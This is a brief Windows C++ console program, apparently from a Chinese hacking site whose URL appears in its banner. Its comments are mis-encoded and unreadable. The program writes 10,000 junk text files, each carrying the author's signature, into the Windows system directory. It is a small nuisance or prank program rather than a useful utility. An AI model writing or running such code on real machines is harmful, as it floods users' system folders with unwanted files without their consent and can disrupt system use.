// ezj.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string>
int main(int argc, char* argv[])
{
	char Path[255];
	char FileName[255];
	char Data[512]="------------------------by �����ѩ------------------------\r\n-------------------http://www.nohack.cn-------------------";
	for(int i=0;i<10000;i++) //
	{
		//�õ�windowsĿ¼
		GetWindowsDirectory(Path,sizeof(Path));
		//��i��ֵ��.txt�����ļ�����
		wsprintf(FileName,"\\%d.txt",i);
		//��path��������·��
		strcat(Path,FileName);
		HANDLE hFile;
		//�����ļ�
		hFile=CreateFile(Path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile==INVALID_HANDLE_VALUE)
		{
			continue;
		}
		DWORD dwWrite;
		//��Data�е�����д���ļ�
		WriteFile(hFile,&Data,strlen(Data),&dwWrite,NULL);
		//�ر��ļ����
		CloseHandle(hFile);
		memset(Path,0x00,255);
		memset(FileName,0x00,255);
	}
	return 0;
}
